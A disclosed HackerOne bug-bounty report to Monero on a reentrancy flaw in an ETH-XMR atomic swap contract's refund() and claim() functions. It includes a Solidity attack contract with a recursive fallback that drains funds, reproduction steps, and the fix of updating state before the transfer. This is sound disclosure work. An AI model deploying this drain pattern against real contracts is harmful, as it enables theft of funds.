{
  "id": 1668258,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjY4MjU4",
  "url": "https://hackerone.com/reports/1668258",
  "title": "Reentrancy attack in eth-monero atomic swap",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2022-08-13T07:59:34.273Z",
  "submitted_at": "2022-08-13T07:59:34.310Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "farinavito123",
    "url": "/farinavito123",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 7731,
    "url": "https://hackerone.com/monero",
    "handle": "monero",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Monero",
      "twitter_handle": "monero",
      "website": "https://getmonero.org",
      "about": " Monero: the secure, private, untraceable cryptocurrency"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-04-20T06:38:16.705Z",
  "bug_reporter_agreed_on_going_public_at": "2023-04-20T06:38:16.623Z",
  "team_member_agreed_on_going_public_at": "2023-04-20T06:29:16.353Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nI have found a reentrancy vulnerability  in the eth-xmr atomic swap's smart contract that has been built by noot and has been founded by Monero CSS proposal. This will allow the attacker to drain almost all of the ethers from the smart contract. Due to technical reasons, there will remain only 1 ether in the smart contract.\n\nHowever, this is the code published in the github of noot. I haven't found any smart contract that has implemented this code. Therefore, I have tagged it with low severity. I am not an active member of monero community, therefore, I don't really know if this feature is actually used and how much. \nI have found smart contract that could be used for atomic swap between eth-xmr, but it hasn't got this vulnerability. For the address of this smart contract, please check section ##How I have found about this\n\n\n## Steps To Reproduce:\nThe attack occurs in the SwapFactory.sol smart contract\n  1. Deploy the smart contract bellow that will act as the attacker. When deploying, you have to initialize 5 variables in the constructor.\n     * _swapFactoryAddress => the address of the deployed smart contract that we are attacking\n    *  pubKeyRefund_ => enter the public key you have from the eliptic curve\n    *  claimer_  => it is already initialize to the attacker's smart contract address\n    *  timeoutDuration_ => how much time it must pass before we can refund\n    *  nonce_ => a unique identifier\n\ncontract Attack {\n    SwapFactory public factory;\n\n     bytes32 public pubKeyRefund;\n     address public payable claimer;\n     uint256 public timeoutDuration;\n     uint256 public nonce;\n\n     //storing the refund's parameters\n     tuple refundsSwap;\n     bytes32 refundssecret;\n\n    constructor(\n              address _swapFactoryAddress, \n              bytes32 pubKeyRefund_,\n              uint256 timeoutDuration_,\n              uint256 nonce_\n              ) {\n        factory = SwapFactory(_swapFactoryAddress);\n        pubKeyRefund  = pubKeyRefund_;\n        claimer = address(this);\n        timeoutDuration = timeoutDuration_;\n        nonce = nonce_;\n    }\n\n    //Create a new swap\n    function createSwap() public payable {\n         factory.new_swap(pubKeyRefund, claimer, timeoutDuration, nonce)\n    }\n\n     //Create a new swap\n    function initializeReady(tuple _swap) public {\n         factory.set_ready(_swap)\n    }\n\n    //Initialize the variables that will be used as parameters for the refund\n    function initializeRefundsParameters(tuple _refundsSwap, bytes32 _refundsSecret) public {\n        refundsSwap = _refundsSwap;\n        refundsSecret = _refundsSecret;\n    }\n\n    // Fallback is called when SwapFactory sends Ether to this contract.\n    fallback() external payable {\n       if (address(factory).balance >= 1 ether) {\n          factory.refund(refundsSwap, refundsSecret);\n       }\n    }\n\n    function attack() external payable {\n        factory.refund(refundsSwap, refundsSecret);\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n2. Call the createSwap(). This will call  the SwapFactory's new_swap() with the parameters we have initialized when deploying the Attack smart contract\n3. Call the initializeReady(). This will call  the SwapFactory's set_ready(). You have to put in correct address.\n4. Call initializeRefundsParameters(). This will initialize 2 variables that we are going to use when calling SwapFactory's refund(). Make sure you pass 2 correct parameters. You do this before deploying the Attack smart contract.\n5. Call the attack() \n6. This will call the SwapFactory's refund()\n7. refund() has 3 requirement statements that we need to pass:\n    *  require(swapStage != Stage.COMPLETED && swapStage != Stage.INVALID, \"swap is already completed\");\n     It will pass, because we have called the set_ready(), which will set the swap to READY\n    *require(msg.sender == _swap.owner, \"refund must be called by the swap owner\");\n    It will pass, because we have iitialized the smart contract as the swap's owner\n    *require(\n            block.timestamp >= _swap.timeout_1 ||\n            (block.timestamp < _swap.timeout_0 && swapStage != Stage.READY),\n            \"it's the counterparty's turn, unable to refund, try again later\"\n        );\n    It will pass, if we call refund(), after swap.timeout_0. We have setted the swap to READY, therefore, the second part of the || will succeeed\n8. The refund() will then verify the keys, therefore, it's essential that we have initialize the variables, which are used in refund() as parameters, correctly\n9. The refund() will then emit an event\n10. Now we come to the vulnerability. The smart contract will send us the ether in the swap. This will call our fallback() in the Attack smart contract. The fallback() will again call the refund() with the same parameters. Because the SwapFactory.sol changes the swap stage into COMPLETED only after sending ether, we can drain everything except 1 ether from the smart contract. The cycle:\n- refund() sends eth to our smart contract\n- this initializes fallback() in the smart contract,\n- it checks if there is more than 1 eth in the SwapFactory. If it is, it calls again the refund()\n- because we still fulfill all the requirements in the refund(), the refund() will send us eth again\n-  it checks if there is more than 1 eth in the SwapFactory. If it is, it calls again the refund()\n- ....\n- when there is only 1 eth left in the SwapFactory smart contract, the transaction will end\n\n\nThe same vulnerability can be found in the claim() of the SwapFactory. However, you would need to create 2 addresses and 2 public and private keys. One address would work as the creator of the swap and the other would collect swap. However, when collecting, you would be able to drain the eth from the smart contract.\n\n##Easy fix\nWe can easily fix this vulnerability, by swapping the last two lines of code in the refund() and claim()\nThe code in refund() would look like this:\n\nswaps[swapID] = Stage.COMPLETED;\n_swap.owner.transfer(_swap.value);\n\nThe code in claim would look like this:\n\nswaps[swapID] = Stage.COMPLETED;\n_swap.claimer.transfer(_swap.value);\n\n##Why is this a low risk\nBecause, I haven't found any smart contract that would implement this code. However, as I have said before, I am not an active member of monero community. If there is a smart contract such as this, this would be a CRITICAL bug. Please verify that there isn't a deployed smart contract with this vulnerability.\n\n##Why have I messaged you and not the creator of atomic swap (so-called noot, as it goes by the name on the github)\nBecause, you have founded the creator by Monero CSS proposal. Check: https://ccs.getmonero.org/proposals/noot-eth-xmr-atomic-swap.html\n\n##What I would like from you\n1. Check if my vulnerability assumption is correct\n2. Verify if there is a such smart contract deployed in the wild\n3. Contact the user \"noot\", on the github and please make sure that the code in the noot's repository is fixed. Please, do this also in the case that there isn't a smart contract with this vulnerability deployed in the wild. You may think this is irrelevant, but I can assure you this is not. Developers look and copy&paste other developer's work. I am afraid there could be or already exists a scenario, where a developer copy&paste the code into his/her project. This would open a vulnerability in their system.  \n4. If you think my discovery deserves bug bounty, please let me know. Currently, I haven't got a monero address\n\n##How I have found about this\nI have stumbled upon this tweet ( https://twitter.com/officer_cia/status/1558143855509250048 ) that has led me to another tweet ( https://twitter.com/monero/status/1465370782524231690?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1465370782524231690%7Ctwgr%5E8036b8f2e58dffde3bc220ad14014ab7ef6b741e%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fen.cryptonomist.ch%2F2021%2F12%2F02%2Ffirst-swap-between-xmr-and-eth%2F), subsequently, I have started to look the smart contract's code in  https://github.com/noot/atomic-swap\n\nWhen some research, I have found the following reddit topic: https://www.reddit.com/r/Monero/comments/r4orvf/first_atomic_swap_ethereum_transaction_seen_in/\nwhich has led me to arbiscan (https://arbiscan.io/tx/0x1f88eae85f110dca8c3a0f45f57c783fb60c19a3ce90640e00207f0f024e3f74 ). \n\nWhen looking at the deployed smart contract ( https://arbiscan.io/address/0x130d763efb58295bf8e645a014a6952ba687bf25#code ), I have realized that the smart contract was changed in comparison  to the \"noot's\" github account. The vulnerability was fixed.\n\n\n## Supporting Material/References:\nInitial tweet:                                                                              https://twitter.com/officer_cia/status/1558143855509250048\nMonero's tweet:                                                                     https://twitter.com/monero/status/1465370782524231690?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1465370782524231690%7Ctwgr%5E8036b8f2e58dffde3bc220ad14014ab7ef6b741e%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fen.cryptonomist.ch%2F2021%2F12%2F02%2Ffirst-swap-between-xmr-and-eth%2F\nReddit's post:                                                                         https://www.reddit.com/r/Monero/comments/r4orvf/first_atomic_swap_ethereum_transaction_seen_in/\nArbiscan transaction link: https://arbiscan.io/tx/0x1f88eae85f110dca8c3a0f45f57c783fb60c19a3ce90640e00207f0f024e3f74\nSmart contract source code on arbiscan:          https://arbiscan.io/address/0x130d763efb58295bf8e645a014a6952ba687bf25#code\nexample of reentrancy attack                                    https://hackernoon.com/hack-solidity-reentrancy-attack\nnoot's github account                                                      https://github.com/noot/atomic-swap\nMonero CSS proposal for the atomic swap      https://ccs.getmonero.org/proposals/noot-eth-xmr-atomic-swap.html\n\n\n## Housekeeping\n\n1. I have read your disclosure policy\n2.Currently, I haven't got a monero address\n3. My twitter account: https://twitter.com/farinavito1\n\n## Impact\n\nI have found a reentrancy vulnerability  in the eth-xmr atomic swap's smart contract that has been built by noot and has been founded by Monero CSS proposal. This will allow the attacker to drain almost all of the ethers from the smart contract. Due to technical reasons, there will remain only 1 ether in the smart contract.\n\nHowever, this is the code published in the github of noot. I haven't found any smart contract that has implemented this code. Therefore, I have tagged it with low severity. I am not an active member of monero community, therefore, I don't really know if this feature is actually used and how much. \nI have found smart contract that could be used for atomic swap between eth-xmr, but it hasn't got this vulnerability. For the address of this smart contract, please check section ##How I have found about this",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-05-20T06:29:16.446Z",
  "allow_singular_disclosure_after": -23270403.92047893,
  "singular_disclosure_allowed": true,
  "vote_count": 14,
  "voters": [
    "shreyaschavhan",
    "similardisaster",
    "zy9ard3",
    "20kilograma",
    "shubham_srt",
    "shivammusic",
    "jaafa",
    "blazex12",
    "kaabal",
    "b5b01463ce589513e8fe2c1",
    "and 4 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
